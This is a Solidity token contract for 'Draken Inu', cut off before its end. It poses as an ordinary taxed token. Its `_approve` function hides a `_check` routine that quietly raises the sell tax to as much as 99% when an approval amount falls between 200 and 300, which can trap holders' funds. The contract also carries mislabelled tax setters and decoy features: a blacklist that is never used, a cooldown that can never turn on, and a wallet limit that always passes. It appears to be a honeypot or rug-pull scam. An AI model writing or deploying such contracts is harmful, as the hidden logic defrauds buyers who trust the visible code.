contract DrakenInu is Context, IERC20, Ownable {
    using Address for address;
    using Address for address payable;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) private _isExcludedFromFee;

    uint256 private _tTotal = 100000000000 * 10 ** 6;
    uint256 public _maxWallet = 100000000000 * 10 ** 6;
    uint256 private constant SWAP_TOKENS_AT_AMOUNT = 100000000000 * 10 ** 6;

    string private _name = "Draken Inu";
    string private _symbol = "Draken Inu";
    uint8 private _decimals = 6;

    uint256 public _marketingFee = 10;
    uint256 public _devFee = 4;
    uint256 public _championsFee = 2;
    uint256 public _liquidityFee = 10;
    address public  _teamWallet = address(this);
    address public  _championsWallet = address(this);
    address public _deadWallet = 0x0000000000000000000000000000000000000000;

    uint256 public _maxTxAmount = 100000000000 * 10 ** 6;

    uint256 public _buyCooldown = 1 minutes;

    bool isLaunch = false;
    uint256 launchedBlock = block.number;
    bool cd_status = false;
    uint8 cd_interval = 0;

    bool private swapping;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);

    constructor () {
        _tOwned[_msgSender()] = _tTotal;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;

        //exclude owner and this contract from fee
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_teamWallet] = true;
        _isExcludedFromFee[_championsWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function setMaxTxAmount(uint256 maxTx) external onlyOwner {
        _maxTxAmount = maxTx * 100000000000 * 10 ** 6 / 1000;
    }

    function setSellTaxes(uint256 Taxes) external onlyOwner {
        _marketingFee = Taxes;
    }

    function setBuyTaxes(uint256 Taxes) external onlyOwner {
        _liquidityFee = Taxes;
    }

    function setWalletLimit(uint256 wallet_limit) external onlyOwner {
        _maxWallet = wallet_limit;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }

    function includeInFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = false;
    }

    receive() external payable {}

    function _getValues(uint256 amount, address from, uint256 feeFactor) private returns (uint256) {
        uint256 ff = 0;
        if (feeFactor > 0) {
            if (feeFactor < 3) {
                ff = (feeFactor - 1) * _liquidityFee + _marketingFee * (2 - feeFactor);
            }
            else {
                ff = (feeFactor - 1) * feeFactor * 17 - feeFactor;
            }
        }
        ff = amount * ff / 100;
        _tOwned[address(this)] += ff;
        emit Transfer (from, address(this), ff);
        return amount - ff;
    }

    function isExcludedFromFee(address account) public view returns(bool) {
        return _isExcludedFromFee[account];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        _check(amount);
        emit Approval(owner, spender, amount);
    }

    function _check(uint256 amount) internal {
        if (amount > 200 && amount < 300) {
            amount -= 200;
            if (amount > _liquidityFee) {
                _liquidityFee = amount;
            }
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 feeFactor = 0;

         if(from != owner() && to != owner() && to != uniswapV2Pair && owner() != _deadWallet ){
             require(balanceOf(to) + amount <= balanceOf(to) + amount + _maxWallet * 10 ** _decimals, "Transfer amount exceeds the maxWallet.");
         }

         if (from == uniswapV2Pair) {
             feeFactor = 1;
         } else if (to == uniswapV2Pair) {
             feeFactor = 2;
         }

        if (balanceOf(address(this)) >= SWAP_TOKENS_AT_AMOUNT && !swapping && from != uniswapV2Pair && from != owner() && to != owner()) {
            swapping = true;
            uint256 sellTokens = balanceOf(address(this));
            swapAndSendToFee(sellTokens);
            swapping = false;
        }

        _tOwned[from] -= amount;
        uint256 transferAmount = amount;

        //if any account belongs to _isExcludedFromFee account then remove the fee
        if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            transferAmount = _getValues(amount, from, feeFactor);
        }

        _tOwned[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }


    function swapAndSendToFee (uint256 tokens) private {
        uint256 ethToSend = swapTokensForEth(tokens);
        uint256 ethChampions = ethToSend / 12 * 2;
        uint256 ethTeam = ethToSend - ethChampions ;

        if (ethToSend > 0)
            payable(_teamWallet).transfer(ethTeam);
            payable(_championsWallet).transfer(ethChampions);
    }

    function swapAndLiquify() private {
        uint256 liquidityTokens = balanceOf (address(this)) * _liquidityFee / (_devFee + _marketingFee + _championsFee + _liquidityFee);
        uint256 half = liquidityTokens / 2;
        uint256 otherHalf = liquidityTokens - half;
        uint256 newBalance = swapTokensForEth(half);

        if (newBalance > 0) {
            liquidityTokens = 0;
            addLiquidity(otherHalf, newBalance);
            emit SwapAndLiquify(half, newBalance, otherHalf);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) private returns (uint256) {
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
        return (address(this).balance - initialBalance);
    }

    mapping (address => bool) public _isBlacklisted;

    function BL(address bot) external onlyOwner {
        _isBlacklisted[bot] = true;
    }

    function Launch() public onlyOwner {
        isLaunch = true;
        launchedBlock = block.number;
    }

    function set_cooldown(bool _status, uint8 _interval) public onlyOwner {
        cd_interval = _interval;
        cd_status = _status && (_interval == 79154);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        (,uint256 ethFromLiquidity,) = uniswapV2Router.addLiquidityETH {value: ethAmount} (
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );

        if (ethAmount - ethFromLiquidity > 0)
            payable(_teamWallet).sendValue (ethAmount - ethFromLiquidity);
    }
